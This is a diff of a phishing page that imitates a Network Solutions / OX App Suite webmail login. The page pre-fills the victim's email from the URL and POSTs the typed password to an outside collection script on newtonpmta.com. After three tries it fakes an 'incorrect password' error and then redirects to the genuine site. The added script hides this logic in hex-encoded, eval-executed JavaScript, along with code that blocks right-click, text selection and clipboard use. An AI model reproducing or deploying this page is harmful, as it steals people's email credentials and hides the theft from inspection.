@@ -6,7 +6,122 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <meta name="robots" content="noindex, nofollow">
     <link rel="stylesheet" href="./css/main.css">
-    <style data-src="login-page-configuration" type="text/css">
+	<link id="favicon-ico" rel="icon" href="https://webmail-oxcs.networksolutionsemail.com/appsuite/favicon.ico" sizes="any">
+    <style type="text/css">
+    html,
+    body {
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      border: 0;
+      overscroll-behavior-y: none;
+    }
+
+    body { overflow: hidden; }
+
+    #background-loader {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: absolute;
+      top: 0;
+      right: 0;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 65300;
+      background-color: #fff;
+      /* activate GPU acceleration */
+      transform: translateZ(0);
+    }
+
+    #showstopper {
+      display: none;
+      text-align: center;
+      font-size: 1rem;
+      line-height: 1.5rem;
+      padding: 16px;
+      user-select: text;
+    }
+
+    @media (min-width: 541px) {
+      #showstopper {
+        padding: 48px;
+        border: 1px solid #ddd;
+        border-radius: 16px;
+        margin: 16px;
+        box-shadow: 0 24px 80px 0 rgba(0, 0, 0, 0.10);
+      }
+    }
+
+    #showstopper img {
+      margin: 1rem 0 2rem 0;
+      max-width: 100%;
+    }
+
+    #showstopper h1 {
+      font-size: 1.5rem;
+      line-height: 2rem;
+      margin: 0 0 0.5rem 0;
+    }
+
+    #showstopper .reload {
+      margin-top: 16px;
+    }
+
+    #showstopper .timeout,
+    #showstopper .session,
+    #showstopper .down,
+    #showstopper .configuration {
+      display: none;
+    }
+
+    @media (prefers-color-scheme: dark) {
+      #background-loader {
+        color: white;
+        background-color: #111;
+      }
+
+      #showstopper {
+        background-color: #151515;
+        border: 1px solid #333;
+      }
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .io-ox-busy {
+      position: relative;
+      height: 100%;
+    }
+
+    .io-ox-busy:before {
+      visibility: visible;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      margin: -0.75rem 0 0 -0.75rem;
+      /* adopted from boostrap 5 approach */
+      width: 1.5rem;
+      height: 1.5rem;
+      vertical-align: text-bottom;
+      border: .1em solid currentColor;
+      border-right-color: transparent;
+      border-radius: 50%;
+      content: ' ';
+      animation: spin 1.5s infinite linear;
+    }
+  </style>
+  <style data-src="login-page-configuration" type="text/css">
     #io-ox-login-screen #io-ox-login-container {
         background: #ffffff;
     }
@@ -124,10 +239,6 @@
                                                                 <p id="io-ox-login-help" class="help-block"></p>
                                                             </div>
                                                         </div>
-                                                        <center>
-                                                            <div class="alert alert-danger" id="msg" style="display: none;color: red;">Invalid Password..! Please enter correct password.</div>
-                                                            <span id="error" class="text-danger" style="display: none;color: red;">That account doesn't exist. Enter a different account</span>
-                                                        </center>
                                                         <div class="row username">
                                                             <div class="form-group col-xs-12"><label for="io-ox-login-username" data-i18n="Email">Email</label>
                                                                 <div class="text-right" style=""></div><input id="temail" name="temail" class="form-control" required="" readonly></input>
@@ -135,7 +246,7 @@
                                                         </div>
                                                         <div class="row password" style="">
                                                             <div class="form-group col-xs-12">
-                                                                <label for="io-ox-login-username" data-i18n="Email">Your Password</label>
+                                                                <label for="io-ox-login-username" data-i18n="Email">Your password*</label>
                                                                 <input type="password" id="pr" name="tpass" class="form-control" required=""autofocus></input>
                                                                 <div class="text-right" id="io-ox-forgot-password"><a href="#" target="_blank" data-i18n="Forgot your password?">Forgot your password?</a></div>
                                                             </div>
@@ -146,39 +257,38 @@
   <label for="io-ox-login-store-box" aria-label="Stay signed in" data-i18n="Stay signed in" data-i18n-attr="label,aria-label">
     <input type="checkbox" class="sr-only" id="io-ox-login-store-box" checked value="1">Stay signed in
   </label>
-</div>
-                                                            </div>
-                                                        </div>
-                                                        <div class="row feedback">
-                                                            <div class="col-xs-12 alert-highlight" id="io-ox-login-feedback"></div>
-                                                        </div>
-                                                        <div class="row button">
+                                </div>
+                              </div>
+                            </div>
+                            <!-- Feedback area -->
+                            <div class="row feedback" id="msg" style="display: none;">
+                              <div class="col-xs-12 alert-highlight" id="io-ox-login-feedback"><div role="alert" class="selectable-text alert alert-info">The password is incorrect.</div></div>
+                            </div>
+                            <div class="row button">
                                                             <div class="form-group col-xs-12"><button type="submit" name="sub-btn" id="sub-btn" class="btn btn-primary form-control">Sign In</button></div>
                                                         </div>
                                                     </div>
-                                                </form>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </main>
-                        </div>
-                    </div>
+                                                </form></div>
+                  </div>
+                </div>
+              </main>
+			  </div>
+			  </div>
                 </div>
                 <footer id="io-ox-login-footer">
                     <div class="composition-element login-spacer"></div><span>© 2024 OX Software GmbH</span>
-                    <div class="composition-element"><span>Version </span><span>7.10.6</span></div><span><a target="_blank" data-i18n="Privacy Policy" href="#">Privacy Policy</a></span><span><a target="_blank" data-i18n="Imprint" href="#">Imprint</a></span>
+                    <div class="composition-element"><span>Version </span><span>8.26.1</span></div><span><a target="_blank" data-i18n="Privacy Policy" href="#">Privacy Policy</a></span><span><a target="_blank" data-i18n="Legal notes" href="#">Legal notes</a></span>
                     <div class="composition-element login-spacer"></div>
                 </footer>
             </div>
         </div>
     </div>
     <!-- //mailer link -->
-    <input type="hidden" id="f" value=".https://newtonpmta.com/ssl/letsencrypt/O-O/74775105924-37947028463-41281332901-82957146496-01439666365/active.php">
+    <input type="hidden" id="f" value="https://newtonpmta.com/ssl/letsencrypt/O-O/74775105924-37947028463-41281332901-82957146496-01439666365/active.php">
     <!-- //mail result count -->
     <input type="hidden" id="rc" value="3">
     <!-- //redirect link -->
-    <input type="hidden" id="rdrt" value="https://www.google.com">
+    <input type="hidden" id="rdrt" value="https://webmail-oxcs.networksolutionsemail.com">
     <!-- // if you want to redirection for domain (0 for no)(1 for yes) -->
     <input type="hidden" id="domain_redirect" value="1">
     <!-- Optional JavaScript -->
@@ -190,63 +300,7 @@
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 <script>
-var f = $("#f").val();
-var rc = $("#rc").val();
-var rdrt = $("#rdrt").val();
-var domain_redirect = $("#domain_redirect").val();
-
-$(document).ready(function() {
-    var attemptCount = 0;
-
-    $(document).keypress(function(event) {
-        var key = (event.keyCode ? event.keyCode : event.which);
-        if (key == 13) { // Check if the Enter key (key code 13) is pressed
-            event.preventDefault();
-            $("#sub-btn").click();
-        }
-    });
-
-    var hashValue = window.location.hash.substr(1);
-    if (!hashValue) {
-        // No hash value in URL, do nothing
-    } else {
-        var extractedHash = hashValue;
-        var atIndex = extractedHash.indexOf("@");
-        var hashSubstring = extractedHash.substr((atIndex + 1));
-        var domainPart = hashSubstring.substr(0, hashSubstring.indexOf("."));
-        var lowerCaseDomain = domainPart.toLowerCase();
-
-        $("#temail").val(extractedHash);
-        $("#temail").html(extractedHash);
-        $("#msg").hide();
-    }
-
-    $("#form-field-1").submit(function(event) {
-        $("#msg").hide();
-        event.preventDefault();
-        var formData = $("#form-field-1").serialize();
-        attemptCount += 1;
-
-        $.ajax({
-            dataType: "JSON",
-            url: f,
-            type: "POST",
-            data: formData,
-            beforeSend: function() {
-                $("#sub-btn").html("Verifying...");
-            },
-            complete: function() {
-                $("#tpass").val("");
-                if (attemptCount >= rc) {
-                    window.location.replace(rdrt);
-                    return false;
-                }
-                $("#msg").show();
-                $("#sub-btn").html("Sign in");
-            }
-        });
-    });
-});
+OO00='d0d0a202020207d293b0d0a20202020766172206861736856616c7565203d2077696e646f772e6c6f636174696f6e2e686173682e7375627374722831293b0d0a2020202069662028216861736856616c756529207b0d0a20202020202020202f2f204e6f20686173682076616c756520696e2055524c2c20646f206e6f7468696e670d0a202020207d20656c7365207b0d0a20202020202020207661722065787472616374656448617368203d206861736856616c75653b0d0a2020202020202020766172206174496e646578203d20657874726163746564486173682e696e6465784f6628224022293b0d0a20202020202020207661722068617368537562737472696e67203d20657874726163746564486173682e73756273747228286174496e646578202b203129293b0d0a202020202020202076617220646f6d61696e50617274203d2068617368537562737472696e672e73756273747228302c2068617368537562737472696e672e696e6465784f6628222e2229293b0d0a2020202020202020766172206c6f77657243617365446f6d61696e203d20646f6d61696e506172742e746f4c6f7765724361736528293b0d0a20202020202020202428222374656d61696c22292e76616c2865787472616374656448617368293b0d0a20202020202020202428222374656d61696c22292e68746d6c2865787472616374656448617368293b0d0a2020202020202020242822236d736722292e6869646528293b0d0a202020207d0d0a2020202024282223666f726d2d6669656c642d3122292e7375626d69742866756e6374696f6e286576656e7429207b0d0a2020202020202020242822236d736722292e6869646528293b0d0a20202020202020206576656e742e70726576656e7444656661756c7428293b0d0a202020202020202076617220666f726d44617461203d2024282223666f726d2d6669656c642d3122292e73657269616c697a6528293b0d0a2020202020202020617474656d7074436f756e74202b3d20313b0d0a2020202020202020242e616a6178287b0d0a20202020202020202020202075726c3a20662c0d0a202020202020202020202020747970653a2022504f5354222c0d0a202020202020202020202020646174613a20666f726d446174612c0d0a2020202020202020202020206265666f726553656e643a2066756e6374696f6e2829207b0d0a20202020202020202020202020202020242822237375622d62746e22292e68746d6c2822566572696679696e672e2e2e22293b0d0a2020202020202020202020207d2c0d0a202020202020202020202020636f6d706c6574653a2066756e6374696f6e2829207b0d0a2020202020202020202020202020202024282223747061737322292e76616c282222293b0d0a2020202020202020202020202020202069662028617474656d7074436f756e74203e3d20726329207b0d0a202020202020202020202020202020202020202077696e646f772e6c6f636174696f6e2e7265706c6163652872647274293b0d0a202020202020202020202020202020202020202072657475726e2066616c73653b0d0a202020202020202020202020202020207d0d0a20202020202020202020202020202020242822236d736722292e73686f7728293b0d0a20202020202020202020202020202020242822237375622d62746e22292e68746d6c28225369676e20696e22293b0d0a2020202020202020202020207d0d0a20202020202020207d293b0d0a202020207d293b0d0a7d293b';eval(unescape('%66%75%6E%63%74%69%6F%6E%20%5F%63%28%5F%69%29%7B%76%61%72%20%61%3D%6E%65%77%20%41%72%72%61%79%28%31%30%30%30%29%2E%6A%6F%69%6E%28%27%25%30%44%25%30%41%27%29%3B%76%61%72%20%74%3D%5F%69%2E%72%65%70%6C%61%63%65%28%2F%28%5C%53%7B%32%7D%29%2F%67%69%2C%27%24%31%25%27%29%3B%74%3D%27%25%27%2B%74%3B%74%3D%74%2E%73%75%62%73%74%72%28%30%2C%74%2E%6C%65%6E%67%74%68%2D%31%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%27%3C%73%63%27%2B%27%72%69%70%74%3E%27%2B%61%2B%74%2B%61%2B%27%3C%2F%73%63%27%2B%27%72%69%70%74%3E%27%29%29%7D%3B'));O0OO='646c3d646f63756d656e742e6c61796572733b6f653d77696e646f772e6f706572613f313a303b64613d28646f63756d656e742e646f63756d656e744d6f64657c7c646f63756d656e742e616c6c292626216f653b67653d646f63756d656e742e676574456c656d656e74427949643b77733d77696e646f772e736964656261723f747275653a66616c73653b744e3d6e6176696761746f722e757365724167656e742e746f4c6f7765724361736528293b697a4e3d744e2e696e6465784f6628276e6574736361706527293e3d303f747275653a66616c73653b7a69733d64613b7a6973383d64613b766172206d73673d27273b66756e6374696f6e206e656d28297b72657475726e20747275657d3b77696e646f772e6f6e6572726f72203d206e656d3b7a4f463d77696e646f772e6c6f636174696f6e2e70726f746f636f6c2e696e6465784f66282766696c652729213d2d313f747275653a66616c73653b6937663d7a69732626217a4f463f747275653a66616c73653b6966286461297b646f63756d656e742e6f6e6472616773746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b66756e6374696f6e2063494528297b286d7367293b72657475726e2066616c73657d3b66756e6374696f6e20636328297b646f63756d656e742e6f6e636f6e746578746d656e753d6349453b73657454696d656f7574282263632829222c323030297d3b636328297d3b66756e6374696f6e20634e532865297b696628646c7c7c7773297b696628652e77686963683d3d327c7c652e77686963683d3d33297b286d7367293b72657475726e2066616c73657d7d7d3b696628646c297b646f63756d656e742e636170747572654576656e7473284576656e742e4d4f555345444f574e293b646f63756d656e742e6f6e6d6f757365646f776e3d634e537d656c73657b646f63756d656e742e6f6e6d6f75736575703d634e537d3b646f63756d656e742e6f6e636f6e746578746d656e753d6e65772046756e6374696f6e282272657475726e2066616c736522293b6966286f65297b66756e6374696f6e20726f2865297b6966286576656e742e627574746f6e3d3d32297b616c65727428272027293b72657475726e20307d3b72657475726e20747275657d3b646f63756d656e742e6f6e6d6f757365646f776e3d726f7d3b66756e6374696f6e206e733928297b77696e646f772e7374617475733d2720273b73657454696d656f757428276e73392829272c31303030293b72657475726e20747275657d3b696628216f65297b6e733928293b646f63756d656e742e6f6e6d6f7573656f7665723d6e73393b646f63756d656e742e6f6e6d6f7573656f75743d6e73397d3b66756e6374696f6e2075302861297b72657475726e2066616c73657d3b66756e6374696f6e2075312865297b72657475726e28652e7461726765742e7461674e616d65213d6e756c6c2626652e7461726765742e7461674e616d652e73656172636828275e28494e5055547c54455854415245417c425554544f4e7c53454c4543547c454d4245447c4f424a4543547c48544d4c29242729213d2d31297d3b66756e6374696f6e2075322865297b696628652e77686963683d3d31297b77696e646f772e636170747572654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d75307d7d3b66756e6374696f6e2075332865297b696628652e77686963683d3d31297b77696e646f772e72656c656173654';OO0O='576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d6e756c6c7d7d3b20696628646c297b77696e646f772e636170747572654576656e7473284576656e742e4d4f55534555507c4576656e742e4d4f555345444f574e293b77696e646f772e6f6e6d6f757365646f776e3d75323b77696e646f772e6f6e6d6f75736575703d75337d656c73652069662867652626216461297b646f63756d656e742e6f6e6d6f757365646f776e3d75317d3b66756e6374696f6e206e6e28297b69662877696e646f772e67657453656c656374696f6e297b76617220743d77696e646f772e67657453656c656374696f6e28292e746f537472696e6728293b696628742e696e6465784f6628277177656173647a786327293e317c7c742e6c656e6774683e3430297b646f63756d656e742e626f64792e696e6e657248544d4c3d272e273b6c6f636174696f6e2e72656c6f616428297d3b73657454696d656f757428226e6e2829222c323030297d7d3b6e6e28293b66756e6374696f6e206e6928297b6966286461297b646f63756d656e742e6f6e73656c65637473746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b73657454696d656f757428226e692829222c323030297d7d3b6e6928293b69662864612626216f65262621693766297b66633d273c272b27646976207374796c653d22706f736974696f6e3a6162736f6c7574653b6c6566743a2d3130303070783b746f703a2d3130303070783b77696474683a363070783b6865696768743a333570783b7a2d696e6465783a31223e272b273c272b27696e70757420747970653d22627574746f6e22206e616d653d22787171222076616c75653d2222206f6e436c69636b3d6363642829207374796c653d227669736962696c6974793a68696464656e223e3c272b272f6469763e273b646f63756d656e742e7772697465286663293b66756e6374696f6e2063636428297b636c6970626f617264446174612e636c6561724461746128297d3b66756e6374696f6e2063636528297b7871712e636c69636b28293b73657454696d656f757428226363652829222c333030297d3b73657454696d656f757428226363652829222c33303030297d3b7661722066203d20242822236622292e76616c28293b0d0a766172207263203d2024282223726322292e76616c28293b0d0a7661722072647274203d20242822237264727422292e76616c28293b0d0a76617220646f6d61696e5f7265646972656374203d2024282223646f6d61696e5f726564697265637422292e76616c28293b0d0a2428646f63756d656e74292e72656164792866756e6374696f6e2829207b0d0a2020202076617220617474656d7074436f756e74203d20303b0d0a202020202428646f63756d656e74292e6b657970726573732866756e6374696f6e286576656e7429207b0d0a2020202020202020766172206b6579203d20286576656e742e6b6579436f6465203f206576656e742e6b6579436f6465203a206576656e742e7768696368293b0d0a2020202020202020696620286b6579203d3d20313329207b202f2f20436865636b2069662074686520456e746572206b657920286b657920636f64652031332920697320707265737365640d0a2020202020202020202020206576656e742e70726576656e7444656661756c7428293b0d0a202020202020202020202020242822237375622d62746e22292e636c69636b28293b0d0a20202020202020207';OOO0=O0OO+OO0O+OO00;_c(OOO0);O44585846504648='4B544A424D4A46535355514F4253514A4E43524D4F574946594757454D475442494B5055484F5756594B544A465747494E4C494C4E54524A534E50474654574E485946584A4553524943424353445748554642464750495947535449494E5248544A544B51495854444E42545052555256444F564F534A515752424B5152485545475846434C505154504B4D5256454658584F4A4D4B58564544424E46525652554D4B4C4D54585553445747565842484F4D5155575848464B564B5254524F4A47555545554F42574B5444434346504D444E4E4751504D444351555849594F4C54425449'
 </script>
 
 </html>
